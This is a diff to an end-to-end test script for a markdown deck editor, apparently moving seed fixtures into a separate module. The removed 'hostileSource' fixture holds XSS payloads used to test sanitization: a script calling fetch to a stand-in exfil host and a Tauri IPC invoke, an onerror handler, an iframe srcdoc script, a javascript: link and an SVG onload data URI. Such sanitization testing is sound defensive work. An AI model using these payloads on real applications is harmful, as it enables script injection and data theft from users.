@@ -9,6 +9,7 @@ import { PIXEL_PNG_MARKDOWN } from "../../../apps/web/test/e2e/scenarios/media-f
 import { SHARED_LIBRARY_CREATE_DELETE_TITLES } from "../../../apps/web/test/e2e/scenarios/library-create-delete.js"
 import { runNativeQuitSmokes } from "./native-quit-smoke.js"
 import { desktopAppEnvironment, verifyOfflineSandbox } from "./offline-macos.js"
+import { e2eDocumentSource, e2eLinkedDocumentSource, hostileSource } from "./fixtures/seeds.mjs"
 
 const e2eRoot = path.dirname(fileURLToPath(import.meta.url))
 const repoRoot = path.resolve(e2eRoot, "../../..")
@@ -28,22 +29,7 @@ const exportContents = path.join(temporaryRoot, "E2E seed exported")
 const expectedSharedSource = `# Saved by shared scenario\n\nThe visual editor changed this text.\n\nSee [[E2E linked]].\n\n${PIXEL_PNG_MARKDOWN}\n**text**\n\n$$\n\\alpha\n$$\n`
 const expectedDesktopSource = expectedSharedSource
 const expectedWebSource = expectedSharedSource
-const hostileSource = [
-  "# Hostile deck",
-  "",
-  "Safe preview text remains visible.",
-  "",
-  '<script>window.__elefHostileScriptRan = true; window.parent.postMessage("hostile", "*"); void fetch("https://example.invalid/exfil").catch(() => {}); window.__TAURI__?.core?.invoke?.("create_deck", { name: "Hostile IPC side effect", kind: "presentation" })</script>',
-  "",
-  '<img src="x" onerror="window.__elefHostileEventRan = true">',
-  '<iframe src="https://example.invalid/frame" srcdoc="<script>parent.__elefHostileFrameRan = true</script>"></iframe>',
-  "",
-  '[unsafe link](javascript:window.__elefHostileLinkRan=true)',
-  "",
-  "![remote image](https://example.invalid/tracker.png)",
-  "![data image](data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E)",
-  ""
-].join("\n")
+
 
 function normalizeLineEndings(source) {
   return source.replace(/\r\n/g, "\n")
@@ -204,8 +190,6 @@ try {
   env.ELEF_E2E_PORTABLE_KEY_SOURCE_ID = portableKeySourceId
   env.ELEF_E2E_PORTABLE_ALIAS_SOURCE_ID = portableAliasSourceId
   const desktopLinkedDocumentId = randomUUID()
-  const e2eDocumentSource = "---\ntheme: dark\n---\n# E2E document\n\nSee [[E2E linked]].\n"
-  const e2eLinkedDocumentSource = "---\ntheme: light\n---\n# E2E linked\n\nTarget document.\n"
   for (const [name, source] of [
     ["E2E document", e2eDocumentSource],
     ["E2E linked", e2eLinkedDocumentSource]
